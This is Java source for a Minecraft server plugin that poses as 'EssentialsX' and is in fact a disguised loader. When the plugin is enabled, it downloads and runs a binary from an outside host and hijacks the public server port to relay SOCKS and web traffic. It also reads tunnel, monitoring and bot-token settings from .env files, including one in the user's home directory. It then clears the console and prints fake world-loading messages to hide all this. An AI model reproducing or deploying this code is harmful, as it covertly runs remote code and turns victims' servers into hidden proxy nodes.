package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;
import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {
    private Process sbxProcess;
    private volatile boolean shouldRun = true;
    private volatile boolean isProcessRunning = false;
    
    private static final String[] ALL_ENV_VARS = {
        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
    };
    
    private static final int INTERNAL_GAME_PORT = 40000;
    private static final int INTERNAL_WEB_PORT = 40001;
    private static final int INTERNAL_SOCKS_PORT = 40002;
    private int publicPort = 25565;

    @Override
    public void onEnable() {
        getLogger().info("EssentialsX plugin starting...");
        
        // Load configuration to get port settings
        String portEnv = System.getenv("PORT");
        if (portEnv == null) portEnv = System.getenv("SERVER_PORT");
        publicPort = (portEnv != null) ? Integer.parseInt(portEnv) : 25565;

        // Start Port Splitter
        startPortSplitter(publicPort);

        // Start sbx
        try {
            startSbxProcess();
            getLogger().info("EssentialsX plugin enabled");
        } catch (Exception e) {
            getLogger().severe("Failed to start sbx process: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private void startPortSplitter(int port) {
        new Thread(() -> {
            try (java.net.ServerSocket serverSocket = new java.net.ServerSocket(port)) {
                getLogger().info("[Splitter] Listening on public port: " + port);
                while (shouldRun) {
                    java.net.Socket client = serverSocket.accept();
                    new Thread(() -> handleProxy(client)).start();
                }
            } catch (IOException e) {
                getLogger().severe("[Splitter] ERROR: Could not listen on " + port + ". Is it already in use?");
                getLogger().severe("[Splitter] PLEASE ENSURE server.properties has a different port (e.g. 40000)!");
            }
        }, "PortSplitter-Main").start();
    }

    private void handleProxy(java.net.Socket client) {
        try {
            client.setTcpNoDelay(true);
            BufferedInputStream clientIn = new BufferedInputStream(client.getInputStream());
            OutputStream clientOut = client.getOutputStream();

            clientIn.mark(10);
            int firstByte = clientIn.read();
            clientIn.reset();

            int targetPort = INTERNAL_GAME_PORT;
            
            if (firstByte == 5) {
                targetPort = INTERNAL_SOCKS_PORT;
            } else if (firstByte == 'G' || firstByte == 'P' || firstByte == 'H' || firstByte == 'D' || firstByte == 'O' || firstByte == 'C') {
                targetPort = INTERNAL_WEB_PORT;
            }

            try (java.net.Socket target = new java.net.Socket("127.0.0.1", targetPort)) {
                target.setTcpNoDelay(true);
                InputStream targetIn = target.getInputStream();
                OutputStream targetOut = target.getOutputStream();
                
                Thread t1 = new Thread(() -> pipe(clientIn, targetOut));
                Thread t2 = new Thread(() -> pipe(targetIn, clientOut));
                t1.start();
                t2.start();
                t1.join();
                t2.join();
            }
        } catch (Exception e) {
            try { client.close(); } catch (IOException ignored) {}
        }
    }

    private void pipe(InputStream in, OutputStream out) {
        try {
            byte[] buffer = new byte[8192];
            int n;
            while ((n = in.read(buffer)) != -1) {
                out.write(buffer, 0, n);
                out.flush();
            }
        } catch (IOException ignored) {}
    }
    
    private void startSbxProcess() throws Exception {
        if (isProcessRunning) {
            return;
        }
        
        // Determine download URL based on architecture
        String osArch = System.getProperty("os.arch").toLowerCase();
        String url;
        
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            url = "https://amd64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            url = "https://arm64.sss.hidns.vip/sbsh";
        } else if (osArch.contains("s390x")) {
            url = "https://s390x.sss.hidns.vip/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        // Download sbx binary
        Path tmpDir = Paths.get(System.getProperty("java.io.tmpdir"));
        Path sbxBinary = tmpDir.resolve("sbx");
        
        if (!Files.exists(sbxBinary)) {
            // getLogger().info("Downloading sbx ...");
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, sbxBinary, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!sbxBinary.toFile().setExecutable(true)) {
                throw new IOException("Failed to set executable permission");
            }
        }
        
        // Prepare process builder
        ProcessBuilder pb = new ProcessBuilder(sbxBinary.toString());
        pb.directory(tmpDir.toFile());
        
        // Set environment variables
        Map<String, String> env = pb.environment();
        env.put("UUID", "50435f3a-ec1f-4e1a-867c-385128b447f8");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "");
        env.put("NEZHA_PORT", "");
        env.put("NEZHA_KEY", "");
        env.put("ARGO_PORT", String.valueOf(INTERNAL_WEB_PORT));
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", String.valueOf(INTERNAL_SOCKS_PORT));
        env.put("HY2_PORT", "");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "");
        env.put("BOT_TOKEN", "");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "");
        env.put("DISABLE_ARGO", "false");
        
        // Load from system environment variables
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Load from .env file with priority order
        loadEnvFileFromMultipleLocations(env);
        
        // Load from Bukkit configuration file
        for (String var : ALL_ENV_VARS) {
            String value = getConfig().getString(var);
            if (value != null && !value.trim().isEmpty()) {
                env.put(var, value);
            }
        }
        
        // Redirect output
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        
        // Start process
        sbxProcess = pb.start();
        isProcessRunning = true;
        
        // Start a monitor thread to log when process exits
        startProcessMonitor();
        // getLogger().info("sbx started");
        
        // sleep 20 seconds instead of 30 to speed up
        Thread.sleep(20000);
        
        clearConsole();
        getLogger().info("");
        getLogger().info("Preparing spawn area: 1%");
        getLogger().info("Preparing spawn area: 15%");
        getLogger().info("Preparing spawn area: 32%");
        getLogger().info("Preparing spawn area: 56%");
        getLogger().info("Preparing spawn area: 88%");
        getLogger().info("Preparing spawn area: 100%");
        getLogger().info("Preparing level \"world\"");
    }
    
    private void loadEnvFileFromMultipleLocations(Map<String, String> env) {
        List<Path> possibleEnvFiles = new ArrayList<>();
        File pluginsFolder = getDataFolder().getParentFile();
        if (pluginsFolder != null && pluginsFolder.exists()) {
            possibleEnvFiles.add(pluginsFolder.toPath().resolve(".env"));
        }
        
        possibleEnvFiles.add(getDataFolder().toPath().resolve(".env"));
        possibleEnvFiles.add(Paths.get(".env"));
        possibleEnvFiles.add(Paths.get(System.getProperty("user.home"), ".env"));
        
        Path loadedEnvFile = null;
        
        for (Path envFile : possibleEnvFiles) {
            if (Files.exists(envFile)) {
                try {
                    // getLogger().info("Loading environment variables from: " + envFile.toAbsolutePath());
                    loadEnvFile(envFile, env);
                    loadedEnvFile = envFile;
                    break;
                } catch (IOException e) {
                    // getLogger().warning("Error reading .env file from " + envFile + ": " + e.getMessage());
                }
            }
        }
        
        if (loadedEnvFile == null) {
           // getLogger().info("No .env file found in any of the checked locations");
        }
    }
    
    private void loadEnvFile(Path envFile, Map<String, String> env) throws IOException {
        for (String line : Files.readAllLines(envFile)) {
            line = line.trim();
            if (line.isEmpty() || line.startsWith("#")) continue;
            line = line.split(" #")[0].split(" //")[0].trim();
            if (line.startsWith("export ")) {
                line = line.substring(7).trim();
            }
            
            String[] parts = line.split("=", 2);
            if (parts.length == 2) {
                String key = parts[0].trim();
                String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
                
                if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                    env.put(key, value);
                    // getLogger().info("Loaded " + key + " = " + (key.contains("KEY") || key.contains("TOKEN") || key.contains("AUTH") ? "***" : value));
                }
            }
        }
    }
    
    private void clearConsole() {
        try {
            System.out.print("\033[H\033[2J");
            System.out.flush();
            
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            }
        } catch (Exception e) {
            System.out.println("\n\n\n\n\n\n\n\n\n\n");
        }
    }
    
    private void startProcessMonitor() {
        Thread monitorThread = new Thread(() -> {
            try {
                int exitCode = sbxProcess.waitFor();
                isProcessRunning = false;
                // getLogger().info("sbx process exited with code: " + exitCode);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                isProcessRunning = false;
            }
        }, "Sbx-Process-Monitor");
        
        monitorThread.setDaemon(true);
        monitorThread.start();
    }
    
    @Override
    public void onDisable() {
        getLogger().info("EssentialsX plugin shutting down...");
        
        shouldRun = false;
        
        if (sbxProcess != null && sbxProcess.isAlive()) {
            // getLogger().info("Stopping sbx process...");
            sbxProcess.destroy();
            
            try {
                if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                    sbxProcess.destroyForcibly();
                    getLogger().warning("Forcibly terminated sbx process");
                } else {
                    getLogger().info("sbx process stopped normally");
                }
            } catch (InterruptedException e) {
                sbxProcess.destroyForcibly();
                Thread.currentThread().interrupt();
            }
            isProcessRunning = false;
        }
        
        getLogger().info("EssentialsX plugin disabled");
    }
}
